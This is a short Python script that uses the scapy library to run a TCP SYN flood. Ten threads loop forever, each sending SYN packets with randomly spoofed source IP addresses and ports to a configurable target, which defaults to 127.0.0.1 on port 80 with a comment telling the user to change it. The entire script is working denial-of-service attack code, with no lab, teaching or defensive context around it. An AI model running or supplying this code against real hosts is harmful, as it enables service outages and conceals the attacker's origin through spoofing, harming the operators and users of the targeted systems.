from scapy.all import *
import random
import threading

# Make sure to change the target IP 
target_ip = "127.0.0.1"
target_port = 80

def syn_flood():
    while True:
        # Generate random source port and IP
        src_port = random.randint(1024, 65535)
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

        # Build TCP SYN packet
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 4294967295))

        # Send the packet (no response handling → half-open)
        send(ip/tcp, verbose=0)

        print(f"Sent SYN from {src_ip}:{src_port}")


num_threads = 10
threads = []

for i in range(num_threads):
    t = threading.Thread(target=syn_flood)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
